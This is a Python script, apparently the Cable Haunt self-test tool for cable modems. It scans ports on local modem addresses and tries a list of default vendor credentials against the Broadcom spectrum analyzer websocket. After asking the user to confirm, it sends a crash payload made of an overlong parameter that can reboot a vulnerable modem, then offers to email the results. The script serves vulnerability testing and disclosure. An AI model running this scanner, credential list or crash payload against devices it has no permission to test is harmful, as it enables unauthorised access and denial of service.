import websockets
import webbrowser
import threading
import time
import socket
import concurrent.futures
import asyncio
from queue import Queue
from typing import Tuple, List
from html import unescape
from base64 import b64encode

# ======== Scan parameters ========
# The Spectrum Analyzer nearly always on ['192.168.100.1'], not the default gateway,
# so please add IPs of changeing it, i.e. ['192.168.100.1', '192.168.1.1']
targets = ['192.168.100.1']
portRange = range(23, 10000)
credentials = [None, "admin:password", 'askey:askey',  "user:Broadcom", 'Broadcom:Broadcom', 'broadcom:broadcom', 'spectrum:spectrum', 'admin:bEn2o#US9s']
# ================================= 

debuging = True
validPayload = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":0,"fStopHz":1218000000,"fftSize":1024,"gain":1,"numOfSamples":1},"id":"0"}'
crashPayload = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":' + 'A'*200 + ',"fftSize":1024,"gain":1,"numOfSamples":1},"id":"0"}'
checkString = 'RPCResultObject'
timeoutTime = 20
tcpTimeOut = 0.3
print_lock = threading.Lock()
possibleTargets = []


def portscan(port, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(tcpTimeOut)
    try:
        con = s.connect((ip, port))
        with print_lock:
            print(ip, ":", port)
            possibleTargets.append((ip, port))
        con.close()
    except:
        pass


def threader():
    while True:
        port, ip = q.get()
        portscan(port, ip)
        q.task_done()


q = Queue()
for x in range(30):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

print("Scanning ports between", portRange.start, "and",
      portRange.stop, "for adresses:", targets)

for ip in targets:
    for port in portRange:
        q.put((port, ip))
q.join()


async def testEndpointWithCredentials(ipPort: Tuple[str, int], data: str, inputCredentials: List[str]):
    try:
        resp = await sendSpectrumData(ipPort, data, inputCredentials[0])
        return resp, inputCredentials[0]
    except websockets.exceptions.WebSocketException as e:
        if "401" in str(e) and len(inputCredentials) > 1:
            return await testEndpointWithCredentials(ipPort, data, inputCredentials[1:])
        else:
            raise


async def sendSpectrumData(ipPort: Tuple[str, int], data: str, credsString: str):
    headers = {}
    if credsString is not None:
        authString=b64encode(credsString.encode())
        headers = {'Authorization': 'Basic ' + (authString).decode("utf-8")}
    uri = 'ws://' + ipPort[0] + ':' + str(ipPort[1]) + '/Frontend'
    async with websockets.connect(uri, extra_headers=headers, subprotocols=['rpc-frontend']) as websocket:
        await websocket.send(data)
        resp = await asyncio.wait_for(websocket.recv(), timeoutTime)
    return resp

victims = []
endpointTestStr = ""
for x in possibleTargets:
    try:
        resp, retCredentials = asyncio.get_event_loop().run_until_complete(testEndpointWithCredentials(x, validPayload, credentials))
        print(resp)
        if checkString in resp:
            victims.append({"target": x, "credentials": retCredentials})
            tmpStr = str(x) + " is a Spectrum Analyser (searching for more endpoints)"
            print(tmpStr)
            endpointTestStr += "%0D%0A" + tmpStr
        else:
            tmpStr = str(x) + " is a websocket endpoint but not the Spectrum Analyzer"
            print(tmpStr)
            endpointTestStr += "%0D%0A" + tmpStr
    except websockets.exceptions.WebSocketException as e:
        tmpStr = str(x) + " is not a websocket endpoint (WebSocketException: " + str(e) + ")"
        print(tmpStr)
        endpointTestStr += "%0D%0A" + tmpStr
        resp=''
    except asyncio.exceptions.TimeoutError as e:
        tmpStr = str(x) + "is a websocket endpoint but not the Spectrum Analyzer (TimeoutError: " + str(e) + ")"
        print(tmpStr)
        endpointTestStr += "%0D%0A" + tmpStr
        resp=''
    except UnicodeDecodeError as e:
        tmpStr = str(x) + "is not a websocket endpoint (UnicodeDecodeError:" + str(e) + ")"
        print(tmpStr)
        endpointTestStr += "%0D%0A" + tmpStr
        resp=''
    except TimeoutError as e:
        tmpStr = str(x) + "is not a websocket endpoint (TimeoutError:", str(e) + ")"
        print(tmpStr)
        endpointTestStr += "%0D%0A" + tmpStr
        resp=''

emailString="Hello Cable Haunt, I have tested my modem for the vulnerability.%0D%0A"
vulnerableEndpoints=[]
nonVulnerableEndpoints=[]
if victims:
    print('Found the spectrum analyser on these endpoints: ', victims)
    print("If we continue your modem might reboot, do you want to continue? (Y/n)")
    ans=input()
    if ans != "n" and ans != "N":
        print('Sending crash payload')
        print('If modem crashes you are vulnerable to Cable Haunt.')
        for victim in victims:
            try:
                resp=asyncio.get_event_loop().run_until_complete(
                    sendSpectrumData(victim['target'], crashPayload, victim['credentials']))
                if checkString in resp:
                    print('Spectrum Analyser responding correctly to crash payload: Not vulnerable -', victim)
                    nonVulnerableEndpoints.append(victim)
            except (websockets.exceptions.WebSocketException, asyncio.exceptions.TimeoutError) as e:
                try:
                    resp=asyncio.get_event_loop().run_until_complete(
                        sendSpectrumData(victim['target'], validPayload, victim['credentials']))
                    if checkString in resp:
                        print('Spectrum Analyser rejecting crash payload and do not crash: Not vulnerable - ', victim)
                        nonVulnerableEndpoints.append(victim)
                except (websockets.exceptions.WebSocketException, asyncio.exceptions.TimeoutError, OSError) as e:
                    print('Spectrum Analyser crashes from clash payload: Vulnerable - ', victim)
                    vulnerableEndpoints.append(victim)
else:
    print('We could not find ip and port for spectrum analyzer. This could mean you are not vulnerable or that we did not test for the correct IP, port or credentials. Please refer to the repo if you want to expand the list of IPs, ports and credentials you are scanning.')

print("Thank you for testing your modem, do you want to send your results to Cable Haunt? (Y/n)")
ans=input()
if ans != "n" and ans != "N":
    print("Who produced your modem? (Leave blank if unknown):")
    emailString += "%0D%0AManufacturer: " + input()
    print("What is the model? (Leave blank if unknown):")
    emailString += "%0D%0AModel: " + input()
    print("What is the firmware version? (Leave blank if unknown):")
    emailString += "­%0D%0AFW: " + input()
    print("Who is your ISP? (Leave blank if unknown):")
    emailString += "­%0D%0AISP: " + input()
    print("Additional comments (Enter ends comment):")
    emailString += "­%0D%0AAdditional comments: " + input()
    emailString += "%0D%0A====================================%0D%0A"
    emailString += "Vul endpoints:     " + str(vulnerableEndpoints) + "%0D%0A"
    emailString += "Nonvul endpoints:  " + str(nonVulnerableEndpoints) + "%0D%0A"
    emailString += "Tested IPs:        " + str(targets) + "%0D%0A"
    emailString += "Port range:        " + str(portRange) + "%0D%0A"
    emailString += "Resp check string: " + str(checkString) + "%0D%0A"
    emailString += "Tested creds:      " + str(credentials) + "%0D%0A"
    emailString += "Timeout:           " + str(timeoutTime) + "%0D%0A"
    emailString += "Valid payload:     " + str(validPayload) + "%0D%0A"
    emailString += "Crash payload:     " + str(crashPayload) + "%0D%0A"
    emailString += str(endpointTestStr)
    webbrowser.open("mailto:cablehaunt@lyrebirds.dk?subject=Cable Haunt modem test&body=" + unescape(emailString))
